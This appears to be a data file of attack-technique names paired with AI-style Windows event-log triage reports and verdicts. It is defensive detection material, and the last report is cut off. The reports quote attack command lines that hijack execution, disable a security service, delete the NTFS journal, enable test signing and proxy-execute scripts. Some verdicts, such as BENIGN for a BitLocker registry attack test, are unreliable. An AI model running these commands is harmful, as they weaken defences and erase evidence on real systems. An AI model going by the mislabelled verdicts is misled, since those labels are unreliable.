   - **Sysmon Events**: There is a repeated execution of `wevtutil.exe` and `conhost.exe` processes by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate utility for managing event logs, repeated execution within a short timeframe raises suspicion, especially if not part of routine administrative tasks.
   
2. **Registry Modification**:
   - The log entry indicating a command execution via `cmd.exe` to add a registry entry (`reg add ""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"" /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f`) is highly concerning. This entry attempts to redirect the execution of Microsoft Edge to Notepad, suggesting potential persistence or execution hijacks for malicious purposes.
   
3. **Privilege Escalation and Suspicious Privilege Use**:
   - **Security Log Event 4672**: The user `admin_test` was granted powerful privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which can be used for privilege escalation or unauthorized system modifications.

4. **Network Logins**:
   - **Logon Events (4624)**: There was a logon for the user `admin_test` using the NTLM authentication from an IP address `192.168.0.102`. Monitoring confirm owner of this IP and the legitimacy of the access would be prudent.

5. **Use of System Tools**:
   - Legitimate system tools such as `wsmprovhost.exe`, `hostname.exe`, and `whoami.exe` are extensively used. These could be indicative of someone exploring system information, potentially to understand their current privileges or the environment.

6. **High-Integrity Processes**:
   - Many processes were executed with `High` integrity level, implying administrative or elevated privileges were leveraged during these operations.

### Assessment and Resolution:

Based on the analysis, there are several activities that point towards potential malicious intent:

- Manipulating registry paths to mislead program execution (`cmd.exe` execution with `reg add`).
- Use of high privileges for potentially unnecessary system modifications.
- Atypical and frequent executions of `wevtutil.exe` and `conhost.exe`.

Considering the combination of suspicious behaviors witnessed, including registry persistence tactics and use of elevated privileges without clear justification, the resolution for the events captured in these logs is determined as **MALICIOUS**.

### Guidance on Proceeding:

1. **Isolate the Affected Host**: To prevent further potential maleficence, immediately isolate the host from the network.
2. **Conduct Additional In-Depth Investigation**: Examine other logs (network traffic, full command history, etc.), and confirm the source of `192.168.0.102`.
3. **Review and Harden Security Configurations**: Validate user roles and privileges, ensuring the principle of least privilege is upheld.
4. **Incident Response Engagement**: Implement incident response procedures, including performing a full security audit of the affected system and network.
5. **Potentially Seek Professional Forensic Analysis**: If the threat level is high, engage with specialized cyber forensics teams for deeper analysis and mitigation strategies.

The detailed review and actions taken ensure that any malicious intent is thoroughly addressed, safeguarding the network and systems from potential breaches or exploits."
Modify EnableBDEWithNoTPM Registry entry,"Upon reviewing the provided Windows event logs, several observations and analyses can be made:

1. **Time Zone and Time Setting Changes:**
   - The `Kernel-General` and `Security-Auditing` logs indicate a change in the system time. This is observed with `EventID 104`, where `OldTime` and `NewTime` are close, but with differences indicative of a time adjustment. 
   - The changes are being conducted by the `svchost.exe` process, associated with service control, indicating legitimate system time syncing activities as expected in a domain environment.

2. **Process Executions Noted:**
   - There are multiple executions of `MicrosoftEdgeUpdate.exe`, observed in both the `Sysmon` logs with proper file signatures and path locations within `Program Files (x86)` and `Temp` directories. Regular update activities seem to be taking place as expected.
   - Commands such as those modifying registry values are executed by an administrative user (`admin_test`), with a high integrity level, which although warrants closer inspection, likely indicates administrative tasks on the server.

3. **Use of Windows Utility Commands:**
   - `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` are executed by the user “SERVER002\\admin_test” with potentially benign commands. However, this indicates some administrative scripts or monitoring activities.

4. **Network and System Utilities:**
   - The `wevtutil.exe` and `conhost.exe` processes are seen multiple times, consistent with logging operations.

5. **Registry Modification:**
   - The `cmd.exe` instance observed adding a registry key related to BitLocker (`HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE`). This action suggests local security policy configuration. The context and source should be verified, but this type of action can be part of normal system configuration.

6. **Privileged Account Activity:**
   - Continuous logs indicate high privilege execution and use of administrative accounts mostly for update and management tasks. Use of `NT AUTHORITY\\SYSTEM` is consistent with system-level updates, which are generally benign.

### Conclusion:

Based on the review, while the logs show a variety of administrative and system-level activities, the actions are carried out by expected processes, accounts, and with appropriate permissions. The behaviors observed align with regular maintenance, update activities, and system administrative tasks.

Given the lack of overtly malicious indicators such as privilege escalation attempts, injection attacks, unusual external communications, or exfiltration of data, the logs appear predominantly benign.

**Resolution:** **BENIGN**"
Code Signing Policy Modification,"Upon analyzing the provided Windows event logs, the following points stand out:

1. **Time Change Events**: There are multiple events related to time changes on the system, specifically Event ID 4616, which denotes System Time Change. These events are logged whenever there is a change in the system time and are often associated with routine processes such as clock synchronization. In this case, the process `svchost.exe` is involved in these activities, which is expected as it's responsible for various Windows services, including time synchronization services. The changes from `20:53:34.6429380` to `20:53:52.0782976` and then to `20:53:52.0788538` do not seem to indicate unauthorized time tampering, considering they are logged as service operations.

2. **Command Line Execution**: There is a specific execution of `cmd.exe` with the command line `bcdedit /set testsigning on`. The `bcdedit` command is typically used to modify the boot configuration data store and enabling test signing indicates that the system could load unsigned drivers. This can be a technique used by attackers to run unauthorized code under the guise of testing. This is a potential security concern that needs further investigation to determine if it was a legitimate operation or part of a compromise.

3. **Process Creation and Sysmon Logs**: The Sysmon logs demonstrate a heavy activity of various `wevtutil.exe` and `conhost.exe` processes and several legitimate-looking processes associated with `MicrosoftEdgeUpdate.exe`. These are normal system and application processes, though their frequency might suggest script or automated task running. Particular attention is drawn to `wevtutil.exe` as it is a command-line utility for managing Windows Event logs and might be used by attackers to clear logs, although no immediate evidence in the logs indicates log tampering here.

4. **User Accounts and Permissions**: The logs also show that the majority of processes, except those related to system services, were executed under the user `SERVER002\admin_test`. This user appears to have high integrity level permissions as a system admin test account. The activities of this account should be audited to ensure all operations are legitimate and authorized.

5. **Edge Update Processes**: There is significant activity involving `Microsoft Edge Update`. These logs detail processes updating and registering components. These appear consistent with typical software update activities rather than malicious behavior.

**Assessment**:
- The most concerning finding is the `bcdedit` command to enable test signing. This action is potentially risky and could indicate an attempt to introduce unsigned drivers, which can compromise system integrity.
- No immediate indicators of data exfiltration or privilege escalation were detected beyond authorized user activities.
- The remaining events appear routine or expected in a managed server environment.

**Guidance on Proceeding**:
- Verify the legitimacy and context for the `bcdedit` command via user `SERVER002\admin_test`. Cross-reference with any ongoing authorized maintenance tasks.
- Conduct a comprehensive review of activities on the `admin_test` account.
- Consider enhancing monitoring for abnormal `bcdedit` operations and any subsequent unsigned driver loads.
- If appropriate, alert the responsible teams of this activity for further scrutiny and ensure the incident response team is ready if needed.

Based on the analysis, the overall resolution is marked as **SUSPICIOUS** due to the `bcdedit` command activity. Further investigation is warranted to determine the authenticity and intent behind the test signing setting change."
Indicator Removal using FSUtil,"After reviewing the provided Windows event logs from the System, Application, Sysmon, Security, and PowerShell channels, I have identified some key activities that are noteworthy:

1. **Sysmon Logs**:
   - Repeated instances of processes `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\\admin_test`.
   - Usage of PowerShell-related activity is absent but might have been used considering the presence of typical administrative activity.
   - Command `fsutil usn deletejournal /D C:` was executed, which is typically related to cleaning NTFS change journals. This can indicate attempts to hide file modification tracks.
   - The presence of `cmd.exe` executing `fsutil usn deletejournal /D C:` is a notable behavior since it can be used by attackers to cover tracks.

2. **Application Logs**:
   - Normal operations related to `Software Protection Platform Service` and `Windows Defender` indicating routine security activities.

3. **Security Logs**:
   - Numerous logon events and privileges assignments related to the system account `SYSTEM`, which is typical but the volume and timing corroborate with substantial system changes.
   - Numerous Event ID 4798 (Enumerated local user groups) with calls from `C:\\Windows\\System32\\taskhostw.exe`, which might indicate script or programmatic enumeration of user account permissions.

4. **Indicators of Potential Malicious Activity**:
   - The execution of `fsutil usn deletejournal /D C:` by `cmd.exe` stands out as potential malicious behavior, commonly associated with an attempt to clean up traces after an unauthorized action.
   - Frequent execution of `wevtutil.exe`, a tool used for exporting Windows event logs, raises suspicion of log tampering.
  
**Conclusion and Recommendations**:
- Resolution: **SUSPICIOUS**
  - The logs do not provide conclusive evidence of 100% malicious intent, but there are red flags that suggest further investigation is warranted, especially concerning journaling and log activities.
  - It is important to conduct a more thorough investigation, including checking for unauthorized user accounts, unusual network connections, and confirming with involved personnel on any scheduled activities that could align with these log events.
  - Review any system changes or alerts around the time these events occurred.

Disable Remote Desktop Security Settings Through Registry,"The logs provided demonstrate a range of benign and potentially suspicious activities. Let's break down the log analysis:

1. **Security Log Analysis:**
   - **Event 4616**: This event indicates a system time change, which can sometimes be associated with malicious activity if an attacker is attempting to hide traces. However, it is not inherently suspicious unless tied directly to malicious context.
   - **Event 4634**: This event indicates a logoff event for user ""admin_test"". Nothing suspicious is noted.
   - **Event 4624**: This is a successful logon event using NTLM authentication for user ""admin_test"". The login is noted from an internal IP, which could indicate a remote connection within the local network.
   - **Events 4672**: This indicates ""admin_test"" received special privileges at logon. The extensive list of privileges looks normal for an administrator session but should always be cross-checked against standard operation procedures.

2. **Sysmon Log Analysis:**
   - **Process Execution**: There is a sequence of executions involving `wevtutil.exe` and `conhost.exe` by user ""admin_test"". Usage of `wevtutil.exe`, in conjunction with other command-line tools like `cmd.exe` and `reg.exe` modifying registry settings (`reg add` operation), can be suspicious especially if `wevtutil.exe` is used to clear or tamper with event logs.
   - **Registry Alteration**: The use of `reg.exe` to add or modify registry settings related to Remote Desktop Services could indicate an attempt to alter security settings maliciously.
   - **Command Line Usage**: The command line execution and registry changes are often associated with setup, configuration, or in some cases, backdoor deployment.

3. **System Log Analysis:**
   - **Time Change Events (Kernel-General EventID 1)**: These reflect alterations in the system time, possibly as a result of a manual change or an external time source update. Although these events can support detection of time tampering, they do not provide direct evidence of malicious activity without context.

**Conclusion:**

The logs do contain an indicator of potentially suspicious behavior due to:
- The sequence and timing of `wevtutil.exe` and `reg.exe` command executions.
- Privilege escalation with significant privileges for an administrative user with subsequent logons using NTLM.
- Registry change commanding related to terminal services, which often suggests an attempt to modify security policies or enable unauthorized access.

Given these observations, the activity is marked as **SUSPICIOUS**. The activity merits further investigation to confirm whether these actions were authorized or if they relate to malicious intent. Specifically:
- Verify if the registry changes and command-line tool usage were part of standard administrative tasks.
- Check if `admin_test` is a legitimate account and authorized to perform those actions.
- Review additional system logs for other unauthorized or unusual changes. 

Further steps should include initiating potential incident response protocols, conducting thorough audits, and implementing monitoring mechanisms to detect any future similar activities."
WINWORD Remote Template Injection,"Based on the provided event log entries, there are a few points to analyze with respect to potential indicators of malicious activity:

1. **Software Protection Platform Service Activity:**
   - The Application log shows a benign entry from the Software Protection Platform Service. This service is associated with Windows licensing and activation and does not indicate malicious activity.

2. **Time Synchronization Events:**
   - The Security log entries with EventID 4616 are related to system time change events. These are likely part of regular time synchronization processes and do not inherently suggest malicious activity.

3. **Sysmon Logs:**
   - There is frequent execution of `wevtutil.exe` and `conhost.exe`, both standard Windows utilities. `wevtutil.exe` is used for managing Windows Event Logs, while `conhost.exe` is associated with console session hosting.
   - An instance of `cmd.exe` executed with a command to start a document (`Calculator.docx`). The path to this document is within a temporary directory, which may require further investigation, particularly if this is not expected behavior or if the file is suspicious.
   - Standard tools like `hostname.exe` and `whoami.exe` were executed, which are legitimate Windows tools, often used in administration and troubleshooting tasks.
   - The processes were executed by a user named `SERVER002\admin_test`, which could be an administrator account. The level of privilege and integrity suggests legitimate administrative actions, but the use of `cmd.exe` to potentially start a document could be a concern depending on context.

4. **System Logs:**
   - System time adjustments and the selection of a time source from `time.windows.com` are documented. These entries appear consistent with regular time synchronization activities performed by the Windows Time Service and do not indicate malicious activity.

### Analysis and Conclusion:

- **Benign Activity:** Most entries appear to be related to regular system operations such as time synchronization, and the use of legitimate utilities under an administrative account. The execution of `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `conhost.exe` are standard behaviors, especially when performed by an administrator.
- **Suspicious Activity:** The launch of a `.docx` file from a temporary directory using `cmd.exe` may warrant further investigation, especially to verify whether this action was performed by a user or automated script, and whether the document's integrity is intact.

**Resolution: SUSPICIOUS**

- **Guidance:** Conduct a deeper investigation into the document `Calculator.docx` that was accessed through the command line from a temporary directory. Verify if `SERVER002\admin_test` actions align with regular administrative operations and rule out unauthorized script execution that could potentially indicate a compromise. Ensure all antivirus and endpoint security tools are up-to-date and perform a targeted scan on the involved files and directories."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"After reviewing the provided Windows event logs, the following observations have been made for each type of log:

### Application Logs
- There are entries related to Windows Defender functioning normally (SECURITY_PRODUCT_STATE_ON) and a service related to edgeupdate being stopped. These appear to be standard operations and do not indicate malicious behavior by themselves.

### Security Logs
- Security Audit logs reveal Event ID 4624 (Logon) and Event ID 4672 (Special Privileges Assigned to New Logon), which indicate successful logon and assignment of special privileges, respectively. These events involve the SYSTEM account, which is typical and generally not suspicious if initiated by legitimate operations.
- Event ID 5379 is repeatedly logged without credentials being returned. This could indicate attempts to access MicrosoftAccount resources. The return code suggests failure in these attempts. Without additional context, these may not necessarily indicate malicious activity.
- Event ID 4798 refers to user rights assignment activities and inquiry into membership of security-enabled local groups (e.g., Administrator, DefaultAccount), which could be part of legitimate system audits or monitoring activities.

### Sysmon Logs
- Commands executed by the user `admin_test` including `whoami.exe`, `hostname.exe`, and other normal system utilities are visible. The execution of PowerShell-related processes seems consistent with regular system operations.
- The execution of `cmd.exe` with a command line including `/c C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;Start-Process calc""` is somewhat suspicious due to unusual command syntax; however, `calc` (Calculator) is a benign application.
- Extensive operations of Microsoft Edge Update are observed, following expected procedures for updating software. There is no indication of tampering within these operations.

### System Logs
- Entries related to Windows Update client (Event ID 19) show security intelligence updates for Microsoft Defender Antivirus, which is standard behavior ensuring the antivirus stays current.

### Conclusion and Recommendations
The logs primarily reflect typical Windows and application update activities, with no direct evidence of compromise or malicious actions. However, the unusual command structure in the Sysmon logs involving `cmd.exe` bears a closer examination to confirm it is not being exploited for illicit actions.

Based on current evidence, the findings lead to the following resolution:
- **Resolution: SUSPICIOUS** - While most activities are benign, further investigation of the `cmd.exe` command line with syntax involving `SyncAppvPublishingServer.vbs` is needed to rule out any potential attack vectors, especially given its strange syntax construction.

### Recommended Actions
1. **Verify the Source**: Investigate the script or process related to the `SyncAppvPublishingServer.vbs` command line entry. Confirm its legitimacy and intent.
2. **Review User Privileges**: Ensure the `admin_test` account and SYSTEM accounts are appropriately secured with no excessive privileges that could be misused.
3. **Monitor Continually**: Set up alerting and continuous monitoring for any anomalies similar to the suspicious command syntax observed.

By following these steps, you will help ensure any overlooked security implications are addressed and mitigate potential threats."
Disable Windows Notification Center,"Upon analyzing the provided Windows event logs, a few key aspects of activity were reviewed to determine any indicators of malicious behavior:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - The logs reveal multiple invocations of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The `wevtutil.exe` is a legitimate utility often used to query or manage information in event logs. The corresponding `conhost.exe` instances appear to be legitimate console host activities aligning with typical usage.
   - While `wevtutil.exe` can be used benignly, its frequent use in quick succession could potentially be associated with attempts to manipulate or clear event logs as part of malicious activity. However, there is no immediate evidence here that it was used for such purposes.

2. **Use of `hostname.exe` and `whoami.exe`:**
   - Both `hostname.exe` and `whoami.exe` are legitimate utilities used to identify the host name and user identity, respectively. These invocations are typical for administrative tasks and troubleshooting, not inherently suspicious.

3. **Registry Modification via `cmd.exe` and `reg.exe`:**
   - A registry change command was executed with command-line argument `\""cmd.exe\"" /c reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f`. This command disables the notification center, which could be part of a broader tactic to reduce visibility for the user.
   - While not immediately malicious, such changes should be examined in conjunction with other unusual activities. This registry modification does raise a red flag and is identified as potentially suspicious.

4. **Edge Update Activity:**
   - There are numerous entries related to Microsoft Edge Update. These appear to be routine updates managed by the system and originating from standard Microsoft directories. The use of `NT AUTHORITY\\SYSTEM` confirms it's conducted under system-level authority, which is standard for such processes.
   - This activity seems benign and consistent with standard update operations.

5. **Time Manipulation Events:**
   - There are entries in the system and security logs showing changes to the system time. Such actions can be associated with attempts to manipulate logs or bypass certain time-based security measures.
   - Usually executed by system services or authorized users, and while these events independently don’t suggest malice, they should be carefully correlated with other suspicious activities.

### Overall Assessment:

- **Benign Elements:**
  - The use of system updates and utilities like `hostname.exe`, `whoami.exe`, and Microsoft Edge Update activities seem standard.

- **Suspicious Elements:**
  - The modification to the registry regarding the notification center and frequent use of `wevtutil.exe` require further investigation to ensure they align with legitimate administrative activities and not part of a malicious sequence.

- **Conclusion:**
  - The logs present elements that are potentially suspicious, warranting closer examination, especially around the context and intent of the registry modification and `wevtutil.exe` usage. There is no conclusive evidence of a malicious compromise, but the activities are irregular enough to recommend further investigation.

### Resolution:
- **SUSPICIOUS** - The logs contain activity that warrants further scrutiny to rule out possible malicious intent, mainly focusing on registry modifications and the use of `wevtutil.exe`."
UACME Bypass Method 59,"After reviewing the provided Windows event logs meticulously, here’s an analysis highlighting the suspicious or potentially malicious activities:

### Suspicious Findings:

1. **Process Execution and Command Line Activity:**
   - Execution of `cmd.exe` with suspicious command-line arguments:
     ```plaintext
     ""C:\\Windows\\system32\\cmd.exe\"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\59 Akagi64.exe
     ```
     This command structure leveraging subdirectory traversal in a temp folder is suspicious as `Akagi64.exe` could potentially be a payload executed from a temporary directory utilizing a bypass method or technique.

   - Presence of `HOSTNAME.EXE` and `WHOAMI.EXE` executions. While these are legitimate Windows binaries, they are being executed in a sequence that might suggest an enumeration stage of an attack:
     ```plaintext
     ""C:\\Windows\\System32\\hostname.exe""
     ""C:\\Windows\\System32\\whoami.exe""
     ```
     These commands could indicate reconnaissance actions.

2. **Use of PowerShell:**
   - Parent process to the suspicious `cmd.exe` indicates the use of PowerShell which is a common tool used for executing potentially harmful scripts and commands.

3. **Multiple EdgeUpdate Executions:**
   - A large number of process creation events involve `MicrosoftEdgeUpdate.exe`, which are likely related to regular updates. However, the volume and rapid succession of these entries, with varying command-line options can sometimes be indicative of being misused for persistence or lateral movement in advanced attack scenarios.

4. **Service Stops:**
   - The `edgeupdate` service repeatedly shows a ""Service stopped"" event. While this could be normal behavior, ensuring this isn’t an attempt to disrupt update mechanisms warrants further investigation.

### Assessment:
While there is no overt sign of a confirmed compromise, the activity related to `cmd.exe` with an unusual command line involving directory traversal paired with accompanying PowerShell execution is suspicious and reflects a potentially malicious technique often used in attacks to bypass Common Controls or execute payloads stealthily. 

The abundant attempt to manage or use `MicrosoftEdgeUpdate.exe` should be verified as legitimate actions to ensure it’s not being leveraged for unwanted persistence or unauthorized actions within the system.

### Resolution:

**SUSPICIOUS** - The combination of multiple subtle indicators suggests this activity is unusual and worth further investigation. Further steps might include:

- Conduct a malware scan on the provided paths (`..\\Externalfiles\\script\\59 Akagi64.exe`) for unknown executables like `Akagi64.exe`.
- Review audit logs for any unauthorized PowerShell script executions or modifications.
- Confirm the legitimacy of the `MicrosoftEdgeUpdate.exe` sequences, ensuring they align with expected application behaviors.

By maintaining awareness of suspicious behavior and examining these isolated incidents holistically, you can ensure that no insidious activity goes undetected."
"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","Based on the analysis of the provided Windows event logs across various channels (PowerShell, Sysmon, Application, Security, and System logs), I've identified the following observations:

### Suspicious or Anomalous Behavior:
- **PowerShell Activity**: There are multiple instances of PowerShell being used to download and execute an installer from an external URL (https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe), which is stored in the temporary directory and then executed. Scripting activity involving the installation of software via PowerShell is not inherently malicious, but it can be suspicious if performed without authorization or oversight.

- **Process Activities**: The logs reveal several instances of `KeyScrambler_Setup.exe` and `KeyScrambler.exe` being executed. There is also evidence of `regsvr32.exe` being used to register and unregister DLLs within the KeyScrambler installation paths. While the use of `regsvr32.exe` can be legitimate, it is often a tool used in DLL hijacking and living-off-the-land attacks, thus warranting suspicion. 

- **Driver Installation**: The installation path `System32\\drivers\\keyscrambler.sys` and the service registration for ""KeyScrambler"" and ""QFX Software Update Service"" indicates an installation of kernel-mode drivers and a service on demand, which is a critical operation. Unauthorized installations of such components could represent a security concern.

- **Lack of Known Publisher**: The logs do not specify a recognized publisher for KeyScrambler-related activity, which raises questions about the legitimacy of the installations.

### Determination:
Upon careful review of the logs, including script execution details and associated processes, these actions could indicate an automatic or script-initiated software installation. While KeyScrambler itself is a legitimate software used for keystroke encryption, the methodology used here (via script without further contextual details or approvals) raises an alarm for potential misuse or unauthorized actions.

### Assessment:
Based upon the observations where the installation and execution procedures of software components (including driver and DLL registration) are carried out in a potentially unmanaged environment via scripts, the following determination is made:

- **Resolution**: **SUSPICIOUS**

This activity needs further investigation to confirm legitimacy:
- Verify if the KeyScrambler installation was part of authorized IT or security team operations.
- Confirm the integrity and source of the downloaded executable file and check against known hashes.
- Check for additional context or user confirmations (e.g., IT change management status) relating to the KeyScrambler installation.
- Review and verify access logs or user activities around the execution periods to confirm or dismiss unauthorized actions.

### Guidance:
1. Conduct an integrity check on the downloaded executable by comparing its hash against known good hashes from the vendor.
2. Obtain confirmation from relevant teams (such as IT or Security) on whether this activity was part of planned operations.
3. Investigate user activities around the times of these logs for any signs of compromise or external involvement.
4. Review system policies and scripts to ensure appropriate safeguards against unauthorized software installations."
Mshta executes VBScript to execute malicious command,"Based on the analysis of the provided Windows event logs, here are the key observations and findings:

**Suspicious Activity:**

1. **Timeshift Detected:**
   - **EventID 4616 in Security Log & EventID 1 in System Log**: There are multiple rapid timestamp changes indicating a backdating of system time. This could indicate an attempt to manipulate time-dependent logging, suggesting the possibility of covering tracks or manipulating other time-based operations.
   - **Impact**: Timeshift can be used to evade detection and make correlation with other logs difficult.

2. **Unusual Command Execution:**
   - **Sysmon EventID 1**: Execution of `cmd.exe` with a command ""/c mshta vbscript:Execute(...powershell.ps1)"" which spawns `mshta.exe` to execute a PowerShell script.
   - **Impact**: Use of `mshta` and `powershell` in such a manner is commonly associated with malicious behavior, particularly for executing scripts or downloading additional payloads stealthily.

3. **Process Execution Patterns:**
   - Frequent execution of `conhost.exe` and `wevtutil.exe` along with `whoami.exe`. While these are legitimate system processes, in combination and repeated rapid execution, they may indicate enumeration of the system or event logs, potentially by a malicious actor seeking information or attempting log tampering.

4. **Privileged Operations Detected:**
   - **EventID 4672**: Shows that the user ""admin_test"" was granted a wide range of privileges including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeTakeOwnershipPrivilege`, which can be misused to escalate privileges or access sensitive data.

5. **Network and Remote Activity:**
   - Logon events from suspicious workstations with NTLM authentication and elevated tokens may suggest lateral movement attempts.

**Assessment:**
- The logs exhibit behaviors typical in reconnaissance, persistence, and possibly privilege escalation phases of an attack. Particularly concerning are the time change manipulation, the PowerShell script execution via `mshta`, and the high privilege token activities.
- These findings flag potential malicious intent or compromise risk. The use of `mshta` to execute a PowerShell script should be immediately investigated as it is not only uncommon but notable for many malware campaigns.

**Resolution: SUSPICIOUS** - The activities observed in the logs are suspicious and warrant a deeper investigation. They do not definitively confirm a compromise but are strongly indicative of potentially malicious actions. Further analysis, such as reviewing the related PowerShell scripts, network traffic, and any data modifications, is essential to confirm or refute malicious activity.

**Guidance for Further Investigation:**
1. **Inspect PowerShell Scripts**: Retrieve and analyze the contents of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\powershell.ps1` and associated files/scripts for malicious content.
   
2. **Time Alteration Analysis**: Review system configurations and services/scripts that may have caused the time change. Investigate the purpose of changes if they coincide with other key timestamps in the logs.
   
3. **Check User Activities**: Monitor and review activities associated with the ‘admin_test’ account and any unusual privileges or sessions.
   
4. **Network Forensics**: Conduct network traffic analysis to and from `192.168.0.102`, including associated workstations for any unauthorized access or lateral movement activities.

5. **Incident Response Plan Activation**: Based on further findings, consider engaging IT security incident response measures to contain potential threats."
Disable Arbitrary Security Windows Service,"Upon analyzing the provided log entries, several points are noteworthy and deserve further attention:

1. **Frequent Invocations of System Utilities:**
   - There are multiple instances of processes `wevtutil.exe` and `conhost.exe` being executed in rapid succession. While `wevtutil.exe` is used for managing Windows Event logs, its frequent execution might be indicative of tampering with the logs or gathering logs unnecessarily, which could suggest an attempt to hide malicious activity.
   - Examples:
     - `""Image"":""C:\\Windows\\System32\\wevtutil.exe""` (Process IDs: 1624, 1524, 7044, 1800, 3468)
     - `""Image"":""C:\\Windows\\System32\\conhost.exe""` (Process IDs: 1752, 2168, 3120, 3776)

2. **Suspicious Command-Line Usage:**
   - The `cmd.exe` process is seen running with a command to stop and then disable the `McAfeeDLPAgentService`. This action is highly suspicious as it involves disabling a Data Loss Prevention (DLP) service which is critical for data protection.
   - Example:
     ```
     ""CommandLine"":""\""cmd.exe\"" /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled"", ""Image"":""C:\\Windows\\System32\\cmd.exe""
     ```

3. **High Integrity Level and Unauthorized Stop `McAfeeDLPAgentService`:**
   - The logs show `cmd.exe` executed with high integrity level privileges, and it's stopping security-related services without obvious authorization or scheduled maintenance, suggesting possible malicious intention.

4. **User ID and Privilege Escalation Concerns:**
   - The actions described above are associated with the user `SERVER002\\admin_test`. This user seems to be executing processes with elevated privileges that might not typically be granted given the operations performed (such as disabling security).

5. **Involvement of Critical Services:**
   - There's an appearance of `wsmprovhost.exe` which is linked to Windows Remote Management. While this might be benign, in conjunction with other actions, it could be indicative of remote administration sometimes used in compromise scenarios.

6. **Edge Update Services:**
   - There are multiple occurrences of processes related to `MicrosoftEdgeUpdate` which seem consistent with legitimate software update activities, such as `MicrosoftEdgeUpdateSetup_X86`. These are expected behaviors for software maintenance.
   
7. **Network Service Account Activity:**
   - Processes like `svchost.exe` and `sppsvc.exe` under `NT AUTHORITY\\NETWORK SERVICE`, appear more benign and related to normal system operations and licensing tasks.

**Conclusion and Recommendation:**
Based on the activities involving deactivation of security services, unusual execution of system utilities for handling logs, and the frequent high privileged executions by a single user, the activities within the logs appear to be of:

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Implement monitoring on user `SERVER002\\admin_test` for further suspicious activities.
- Review and audit the actions of disabling McAfeeDLPAgentService for legitimacy.
- Conduct a thorough investigation of `wevtutil.exe` invocations to confirm if log tampering occurred.
- Investigate the system for potential indicators of persistence, privilege escalation, or any backdoor installations.
- Ensure all security measures (e.g., antivirus, DLP) are operational and configured to alert on critical changes.
- Consider engaging with an incident response team if further evidence of compromise is discovered."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"### Analysis:

Upon reviewing the provided logs, several elements stand out that warrant further examination and analysis:

1. **Time Synchronization Events (System Log):**
   - The log entries in the System log show multiple entries related to time synchronization using `svchost.exe`, which is a normal part of Windows operation for time synchronization using the Windows Time Service, with the NTP server specified as `time.windows.com`.

2. **Edge Update Events (Application and Sysmon Logs):**
   - There are numerous events related to Microsoft Edge updating itself. These include processes like `MicrosoftEdgeUpdate.exe` being executed with various command-line arguments such as `/svc`, `/update`, `/regsvc`, `/regserver`, `/c`, `/ua`, and `/ping`.
   - These activities appear procedural and consistent with a legitimate automatic application update process.

3. **PowerShell Event (PowerShell Log and Sysmon Log):**
   - A PowerShell command invoked to set a registry property using `New-ItemProperty`, which appears to disable the Windows Defender operational event channel. This activity is suspicious because it involves modifying registry settings related to security monitoring and suggests an intent to reduce visibility over security events.
   - The process initiating this modification is `powershell.exe` executed with a command to alter Windows security settings, which is unexpected and warrants further scrutiny.

4. **Process Execution (Sysmon Log):**
   - The Sysmon logs capture several instances of process executions linked to the update activity. No unfamiliar or unauthorized executables outside the standard operating system and application maintenance processes were identified.

### Assessment:

- **Time synchronization events** and **Edge update events** appear benign, forming part of normal operations—maintaining correct system time and application updates, respectively. 
- **The PowerShell command to alter registry settings** for the Windows Defender operational event channel is anomalous and suspicious. This could potentially be indicative of attempts to weaken security posture or conceal malicious actions.

### Conclusion:

Based on the detailed analysis of the provided log entries, the final resolution is categorized as **SUSPICIOUS** due to the detected attempt to disable event logging channels via PowerShell, which requires further investigation to ascertain intent and potential impact:

- **Actionable Recommendations:**
  - Conduct a detailed review of the PowerShell execution history to identify the source and context of the script or command execution.
  - Correlate this activity with user actions and other log entries to determine if any unauthorized access or privilege escalation occurred.
  - Implement monitoring to catch and alert on similar attempts to disable or modify security event logging in the future."
DLL Side-Loading using the dotnet startup hook environment variable,"Upon analysis of the provided Windows event logs, here is a detailed assessment focusing on unusual processes, command-line arguments, and potential indicators of malicious activity:

1. **Application Log:**
   - The application log contains a benign log entry related to the stopping of a service (`edgeupdate`).

2. **Sysmon Logs:**
   - The majority of Sysmon logs reference the execution of Microsoft Edge Update executables. This typically involves scheduled or manual updates of the Edge browser, with processes being executed under the `NT AUTHORITY\SYSTEM` account, which is a standard high-privilege account for system level operations.
   
   - Several events, such as the process creation (`ID 1`) and pipe connected (`ID 5`) events, show repeated executions of the `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`. These are normal for auto-update operations for Microsoft Edge.

   - **Suspicious Finding:**
     - A critical examination of command line parameters shows an anomaly:
       - `cmd.exe` being executed with a command line referencing `DOTNET_STARTUP_HOOKS` in conjunction with a custom DLL (`preloader.dll`). Such command lines may hint at a potential environment variable hijacking or code injection attempt, especially since it occurs in a temp directory path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\preloader.dll`.
       - This can be evidence of a potentially malicious activity aimed at executing unauthorized or malicious code. The execution of .NET related commands with hooks is often associated with runtime manipulation or side-loading attacks.

3. **Security and System Logs:**
   - The security log provided is empty, missing important information that could help in analyzing login failures, privilege changes, or any unauthorized access attempts.
   - The system log is also missing, which might otherwise provide evidence of critical system-level changes or errors which could reinforce suspicious activities detected.

**Assessment:**
